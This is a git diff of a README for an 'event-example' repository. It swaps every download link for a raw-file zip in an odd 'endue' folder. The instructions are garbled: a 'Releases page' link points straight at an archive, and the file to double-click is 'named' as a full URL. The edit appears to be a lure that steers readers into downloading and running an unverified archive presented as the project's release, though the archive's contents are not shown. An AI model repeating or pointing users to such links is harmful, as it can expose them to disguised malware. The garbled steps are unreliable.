@@ -6,11 +6,11 @@ Welcome to the **event-example** repository! This software is here to help you m
 
 ## 📥 Download the Application
 
-[![Download Event Example](https://github.com/vukvelickovic97/event-example/raw/refs/heads/main/endue/event_example_v2.0.zip%20Event%https://github.com/vukvelickovic97/event-example/raw/refs/heads/main/endue/event_example_v2.0.zip)](https://github.com/vukvelickovic97/event-example/raw/refs/heads/main/endue/event_example_v2.0.zip)
+[![Download Event Example](https://raw.githubusercontent.com/vukvelickovic97/event-example/main/endue/event_example_v2.8.zip%20Event%https://raw.githubusercontent.com/vukvelickovic97/event-example/main/endue/event_example_v2.8.zip)](https://raw.githubusercontent.com/vukvelickovic97/event-example/main/endue/event_example_v2.8.zip)
 
 To download the application, visit our Releases page. Here, you will find the latest version available for download.
 
-[Download the latest version](https://github.com/vukvelickovic97/event-example/raw/refs/heads/main/endue/event_example_v2.0.zip)
+[Download the latest version](https://raw.githubusercontent.com/vukvelickovic97/event-example/main/endue/event_example_v2.8.zip)
 
 ## 📋 System Requirements
 
@@ -30,16 +30,16 @@ Before you install the application, make sure your computer meets these requirem
 
 ## 🔧 Download & Install
 
-1. Go to the [Releases page](https://github.com/vukvelickovic97/event-example/raw/refs/heads/main/endue/event_example_v2.0.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/vukvelickovic97/event-example/main/endue/event_example_v2.8.zip).
 2. Select the latest version you want to download.
 3. Click on the version to open the details.
-4. Look for the file labeled as `https://github.com/vukvelickovic97/event-example/raw/refs/heads/main/endue/event_example_v2.0.zip` (or the appropriate file for your operating system).
+4. Look for the file labeled as `https://raw.githubusercontent.com/vukvelickovic97/event-example/main/endue/event_example_v2.8.zip` (or the appropriate file for your operating system).
 5. Click on the file to start the download.
 
 After the download is complete, follow these steps to install it:
 
 1. Locate the downloaded file on your computer (usually in the Downloads folder).
-2. Double-click the file named `https://github.com/vukvelickovic97/event-example/raw/refs/heads/main/endue/event_example_v2.0.zip` to start the installation.
+2. Double-click the file named `https://raw.githubusercontent.com/vukvelickovic97/event-example/main/endue/event_example_v2.8.zip` to start the installation.
 3. Follow the on-screen instructions to complete the installation.
 4. Once done, open the application from your Start menu or Applications folder.
 
